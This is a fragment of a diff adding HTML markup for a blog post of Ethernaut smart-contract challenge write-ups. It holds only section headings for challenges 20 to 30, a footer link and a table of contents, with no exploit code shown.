+<h2 id="20-ethernaut20---allen-codex">20. Ethernaut20 - Allen Codex</h2>
+<h2 id="21-ethernaut21---denial">21. Ethernaut21 - Denial</h2>
+<h2 id="22-ethernaut22---shop">22. Ethernaut22 - Shop</h2>
+<h2 id="23-ethernaut23---dex">23. Ethernaut23 - Dex</h2>
+<h2 id="24-ethernaut24---dex-two">24. Ethernaut24 - Dex Two</h2>
+<h2 id="25-ethernaut25---puzzle-wallet">25. Ethernaut25 - Puzzle Wallet</h2>
+<h2 id="26-ethernaut26---motorbike">26. Ethernaut26 - Motorbike</h2>
+<h2 id="27-ethernaut27---doubleentrypoint">27. Ethernaut27 - DoubleEntryPoint</h2>
+<h2 id="28-ethernaut28---good-samaritan">28. Ethernaut28 - Good Samaritan</h2>
+<h2 id="29-ethernaut29---gatekeeper-three">29. Ethernaut29 - Gatekeeper Three</h2>
+<h2 id="30-ethernaut30---switch">30. Ethernaut30 - Switch</h2>
+
+  
+  <hr>
+<div class="footer">
+    
+	    
+	    
+            <div class="next-post">
+                <a href="/posts/nas-docker-rss-subscription-service/?ref=footer"><span style="font-weight:bold;">Next »</span><br>Nas Docker Rss Subscription Service</a>
+            </div>
+        
+    
+</div>
+
+  
+</div>
+            </main>
+            
+  
+    <div class="article-toc ">
+    <div class="toc-wrapper">
+      <h4 id="contents"></h4>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#study-material">Study Material</a></li>
+    <li><a href="#1-ethernaut0---hello-ethernaut">1. Ethernaut0 - Hello Ethernaut</a>
+      <ul>
+        <li><a href="#11-solution">1.1 Solution</a></li>
+        <li><a href="#12-remark">1.2 Remark</a></li>
+      </ul>
+    </li>
+    <li><a href="#2-ethernaut1---fallback">2. Ethernaut1 - Fallback</a>
+      <ul>
+        <li><a href="#21-solution">2.1 Solution</a></li>
+        <li><a href="#22-remark">2.2 Remark</a></li>
+      </ul>
+    </li>
+    <li><a href="#3-ethernaut2---fallout">3. Ethernaut2 - Fallout</a>
+      <ul>
+        <li><a href="#31-solution">3.1 Solution</a></li>
+        <li><a href="#32-remark">3.2 Remark</a></li>
+      </ul>
+    </li>
+    <li><a href="#4-ethernaut4---coin-flip">4. Ethernaut4 - Coin Flip</a>
+      <ul>
+        <li><a href="#41-solution">4.1 Solution</a></li>
+        <li><a href="#42-remark">4.2 Remark</a></li>
+      </ul>
+    </li>
+    <li><a href="#5-ethernaut5---telephone">5. Ethernaut5 - Telephone</a>
+      <ul>
+        <li><a href="#51-solution">5.1 Solution</a></li>
+        <li><a href="#52-remark">5.2 Remark</a></li>
+      </ul>
+    </li>
+    <li><a href="#6-ethernaut6---token">6. Ethernaut6 - Token</a>
+      <ul>
+        <li><a href="#61-solution">6.1 Solution</a></li>
+        <li><a href="#62-remark">6.2 Remark</a></li>
+      </ul>
+    </li>
+    <li><a href="#7-ethernaut7---delegation">7. Ethernaut7 - Delegation</a>
+      <ul>
+        <li><a href="#71-solution">7.1 Solution</a></li>
+        <li><a href="#72-remark">7.2 Remark</a></li>
+      </ul>
+    </li>
+    <li><a href="#8-ethernaut8---force">8. Ethernaut8 - Force</a>
+      <ul>
+        <li><a href="#81-solution">8.1 Solution</a></li>
+        <li><a href="#82-remark">8.2 Remark</a></li>
+      </ul>
+    </li>
+    <li><a href="#9-ethernaut9---vault">9. Ethernaut9 - Vault</a>
+      <ul>
+        <li><a href="#91-solution">9.1 Solution</a></li>
+        <li><a href="#92-remark">9.2 Remark</a></li>
+      </ul>
+    </li>
+    <li><a href="#10-ethernaut10---king">10. Ethernaut10 - King</a>
+      <ul>
+        <li><a href="#101-solution">10.1 Solution</a></li>
+        <li><a href="#102-remark">10.2 Remark</a></li>
+      </ul>
+    </li>
+    <li><a href="#11-ethernaut11---re-entrancy">11. Ethernaut11 - Re-entrancy</a>
+      <ul>
+        <li><a href="#111-solution">11.1 Solution</a></li>
+        <li><a href="#112-remark">11.2 Remark</a></li>
+      </ul>
+    </li>
+    <li><a href="#12-ethernaut12---elevator">12. Ethernaut12 - Elevator</a>
+      <ul>
+        <li><a href="#121-solution">12.1 Solution</a></li>
+        <li><a href="#122-remark">12.2 Remark</a></li>
+      </ul>
+    </li>
+    <li><a href="#13-ethernaut13---privacy">13. Ethernaut13 - Privacy</a>
+      <ul>
+        <li><a href="#131-solution">13.1 Solution</a></li>
+        <li><a href="#132-remark">13.2 Remark</a></li>
+      </ul>
+    </li>
+    <li><a href="#14-ethernaut14---gatekeeper-one">14. Ethernaut14 - Gatekeeper One</a>
+      <ul>
+        <li><a href="#141-solution">14.1 Solution</a></li>
+        <li><a href="#142-remark">14.2 Remark</a></li>
+      </ul>
+    </li>
+    <li><a href="#15-ethernaut15---gatekeeper-two">15. Ethernaut15 - Gatekeeper Two</a></li>
+    <li><a href="#16-ethernaut16---naught-coin">16. Ethernaut16 - Naught Coin</a></li>
+    <li><a href="#17-ethernaut17---preservation">17. Ethernaut17 - Preservation</a></li>
+    <li><a href="#18-ethernaut18---recovery">18. Ethernaut18 - Recovery</a></li>
+    <li><a href="#19-ethernaut19---magicnumber">19. Ethernaut19 - MagicNumber</a></li>
+    <li><a href="#20-ethernaut20---allen-codex">20. Ethernaut20 - Allen Codex</a></li>
+    <li><a href="#21-ethernaut21---denial">21. Ethernaut21 - Denial</a></li>
+    <li><a href="#22-ethernaut22---shop">22. Ethernaut22 - Shop</a></li>
+    <li><a href="#23-ethernaut23---dex">23. Ethernaut23 - Dex</a></li>
+    <li><a href="#24-ethernaut24---dex-two">24. Ethernaut24 - Dex Two</a></li>
+    <li><a href="#25-ethernaut25---puzzle-wallet">25. Ethernaut25 - Puzzle Wallet</a></li>
+    <li><a href="#26-ethernaut26---motorbike">26. Ethernaut26 - Motorbike</a></li>
+    <li><a href="#27-ethernaut27---doubleentrypoint">27. Ethernaut27 - DoubleEntryPoint</a></li>
+    <li><a href="#28-ethernaut28---good-samaritan">28. Ethernaut28 - Good Samaritan</a></li>
+    <li><a href="#29-ethernaut29---gatekeeper-three">29. Ethernaut29 - Gatekeeper Three</a></li>
+    <li><a href="#30-ethernaut30---switch">30. Ethernaut30 - Switch</a></li>
+  </ul>
+</nav>
+    </div>
+</div>
+
+  
+
+        </div>
+    </body>
+</html>
